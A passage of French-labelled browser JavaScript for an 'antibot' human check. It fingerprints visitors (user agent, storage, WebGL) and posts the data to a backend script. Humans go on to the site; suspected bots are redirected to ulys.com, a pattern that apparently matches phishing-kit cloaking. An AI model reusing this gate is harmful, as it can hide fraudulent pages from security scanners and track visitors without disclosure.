                    info.is_edge = getSafeValue(() => navigator.userAgent.indexOf('Edge') !== -1 || navigator.userAgent.indexOf('Edg/') !== -1);
                    info.is_mobile = getSafeValue(() => /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
                    
                    info.localStorage_available = getSafeValue(() => {
                        try {
                            localStorage.setItem('test', 'test');
                            localStorage.removeItem('test');
                            return true;
                        } catch (e) {
                            return false;
                        }
                    });
                    
                    info.sessionStorage_available = getSafeValue(() => {
                        try {
                            sessionStorage.setItem('test', 'test');
                            sessionStorage.removeItem('test');
                            return true;
                        } catch (e) {
                            return false;
                        }
                    });
                    
                    const webglInfo = getSafeValue(() => {
                        const canvas = document.createElement('canvas');
                        const webgl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        if (webgl) {
                            return {
                                vendor: webgl.getParameter(webgl.VENDOR),
                                renderer: webgl.getParameter(webgl.RENDERER)
                            };
                        }
                        return { vendor: "none", renderer: "none" };
                    });
                    
                    info.webgl_vendor = webglInfo.vendor;
                    info.webgl_renderer = webglInfo.renderer;
                    
                    return info;
                } catch (error) {
                    info.collection_error = error.message;
                    return info;
                }
            }
              
            function handleServerResponse(result) {
                const label = document.getElementById('humain-check-text');
                if (!result.is_bot && result.client_id) {
                    label.innerHTML = "Redirection en cours...";
                    document.documentElement.style.setProperty('--loader-color', 'white');
                    setTimeout(function() {
                        window.location.href = "/";
                    }, 1000);
                } else {
                    label.innerHTML = "Activité suspecte détectée";
                    document.documentElement.style.setProperty('--loader-color', 'red');
                    
                    if (!result.client_id) {
                        result.client_id = generateClientId();
                    }
                    
                    setTimeout(function() {
                        window.location.href = "https://ulys.com/";
                    }, 1000);
                }
            }
            
            function sendToServer(data) {                
                try {                
                    fetch('/backend/antibot/validation/collect_info.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify(data),
                        credentials: 'same-origin'
                    })
                    .then(response => {
                        return response.json();
                    })
                    .then(result => {
                        handleServerResponse(result);
                    })                    
                    .catch(error => {              
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', '/backend/antibot/validation/collect_info.php', true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        
                        xhr.onreadystatechange = function() {
                            const label = document.getElementById('humain-check-text');
                            if (xhr.readyState === 4) {
                                if (xhr.status === 200 || xhr.status === 403) {
                                    try {
                                        const result = JSON.parse(xhr.responseText);
                                        handleServerResponse(result);
                                    } catch (e) {
                                        label.innerHTML = "Une erreur s'est produite";
                                        document.documentElement.style.setProperty('--loader-color', 'red');
                                        
                                        setTimeout(function() {
                                            window.location.href = "https://ulys.com/";
                                        }, 1000);
                                    }
                                } else {
                                    label.innerHTML = "Une erreur s'est produite";
                                    document.documentElement.style.setProperty('--loader-color', 'red');
                                    
                                    setTimeout(function() {
                                        window.location.href = "https://ulys.com/";
                                    }, 1000);
                                }
                            }
                        };
                        
                        xhr.send(JSON.stringify(data));
                    });
                } catch (error) {
                    label.innerHTML = "Une erreur s'est produite";
                    document.documentElement.style.setProperty('--loader-color', 'red');
                    
                    setTimeout(function() {
                        window.location.href = "https://ulys.com/";
                    }, 1000);
                }
            }
            
            collectBrowserInfo().then(data => {
                sendToServer(data);
            }).catch(error => {});
